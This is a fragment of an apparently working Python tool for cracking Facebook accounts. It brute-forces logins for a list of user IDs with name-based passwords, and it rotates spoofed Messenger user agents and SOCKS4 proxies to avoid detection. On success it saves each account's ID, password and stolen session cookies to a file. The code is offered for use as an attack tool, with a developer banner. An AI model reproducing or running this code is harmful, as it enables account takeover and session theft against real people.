...
def sex():
	...
	ua = "[FBAN/Orca-Android;FBAV/248.1.0.44.116;FBBV/184540730;FBDM/{density=2.7,width=1440,height=1920};FBLC/en_AF;FBCR/Banglalink;FBMF/Samsung;FBBD/Galaxy S10;FBPN/com.facebook.orca;FBDV/Galaxy S10/8.0;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:armeabi-v7l-armeabi;]','[FBAN/Orca-Android;FBAV/177.0.0.49.105;FBBV/114406492;FBDM/{density=1.9,width=2160,height=3850};FBLC/en_GB;FBCR/Zong;FBMF/Samsung;FBBD/Galaxy S10;FBPN/com.facebook.orca;FBDV/Galaxy S10/8.0;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:armeabi-v7l-armeabi;]','[FBAN/Orca-Android;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=1.9,width=720,height=1280};FBLC/ko_KR;FBCR/Claro;FBMF/Google;FBBD/Pixel 4;FBPN/com.facebook.orca;FBDV/Pixel 4/11.0;FBSV/11.0;FBOP/1;FBCA/arm64-v8a:armeabi-v7l-armeabi;]"
	return ua
...
..::::..:::......::::..:::::..::
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{A} NGR AFGHAN
{G1}[{A}≈{G1}]{G1} FACEBOOK  {A}➢{A} ngrafghan170
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{A} FILE 
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢ 0.1
...
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A} NGR.txt');linex()
...
def M1(ids,names,psd):
    ...
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}NGR{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
    ...
    'viewport-width': '980',
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1} NGR-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/ NGR-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
